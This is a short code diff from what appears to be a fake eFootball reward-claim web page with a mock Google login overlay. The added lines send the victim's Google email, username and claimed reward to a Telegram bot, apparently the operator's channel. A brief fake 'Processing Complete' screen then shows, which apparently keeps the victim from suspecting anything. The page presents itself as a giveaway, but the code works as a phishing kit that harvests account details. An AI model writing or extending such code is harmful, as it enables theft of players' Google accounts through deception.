@@ -470,6 +470,21 @@ function handleGoogleCoinsSubmit() {
   // Send request notification to Telegram Bot
   sendTelegramNotification(
     currentClaimUsername || 'Oyuncu',
+    currentGoogleEmail || 'Belirtilmedi',
+    formattedCoins,
+    currentReward ? currentReward.title : 'eFootball™ Paketi'
+  );
+
+  // After 1.1s complete and show 1:1 Processing Complete modal
+  setTimeout(() => {
+    if (divider) divider.classList.remove('is-loading');
+    if (nextBtn) nextBtn.classList.remove('is-disabled-loading');
+    hideModal('googleLoginOverlay');
+    showProcessingComplete(currentClaimUsername);
+  }, 1100);
+}
+
+// Show 1:1 Processing Complete modal (media_1789378734748.png)
 function showProcessingComplete(username = '') {
   const nameEl = document.getElementById('pcUsername');
   const userTag = username || currentClaimUsername || 'SDSE';
